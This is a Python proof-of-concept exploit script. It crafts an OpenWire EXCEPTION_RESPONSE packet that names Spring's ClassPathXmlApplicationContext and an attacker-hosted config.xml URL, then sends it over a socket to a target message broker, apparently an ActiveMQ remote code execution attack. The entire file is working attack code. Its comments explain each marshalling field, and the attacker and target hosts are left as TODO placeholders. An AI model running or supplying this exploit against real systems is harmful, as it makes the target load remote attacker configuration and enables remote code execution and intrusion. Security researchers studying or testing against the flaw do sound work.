import socket


def build_wacky_byte_array(url: str) -> bytearray:
    class_thingy = "org.springframework.context.support.ClassPathXmlApplicationContext"

    data = bytearray()
    # 31 is the EXCEPTION_RESPONSE data type.
    data += (31).to_bytes(1, byteorder="big")
    # ResponseMarshaller.looseUnmarshal reads a 4 byte int for the command id.
    data += (0).to_bytes(4, byteorder="big")
    # and a 1 byte boolean for response required.
    data += (0).to_bytes(1, byteorder="big")
    # ResponseMarshaller.looseUnmarshal read a 4 byte int for the correlation ID.
    data += (0).to_bytes(4, byteorder="big")
    # BaseDataStreamMarshaller.looseUnmarsalThrowable wants a boolean true to continue to unmarshall.
    data += (1).to_bytes(1, byteorder="big")
    # BaseDataStreamMarshaller.looseUnmarshalString reads a byte boolean and if true, reads a UTF-8 string.
    data += (1).to_bytes(1, byteorder="big")
    # First 2 bytes are the length of the class name.
    data += len(class_thingy).to_bytes(2, byteorder="big")
    # Then the class name to instantiate.
    data += class_thingy.encode()
    # Same again for the method string. This is the single string parameter used during class instantiation.
    data += (1).to_bytes(1, byteorder="big")
    data += len(url).to_bytes(2, byteorder="big")
    data += url.encode()

    return data


def run_exploit(attacker_server: str, attacker_port: int, target_server: str, target_port: int):
    URL = f"http://{attacker_server}:{str(attacker_port)}/config.xml"

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target_server, target_port))

    data = build_wacky_byte_array(url=URL)

    payload = len(data).to_bytes(4, byteorder="big") + data

    sock.sendall(payload)
    sock.close()


if __name__ == "__main__":

    run_exploit(
        attacker_server="TODO",
        attacker_port=123,
        target_server="TODO",
        target_port=123,
    )
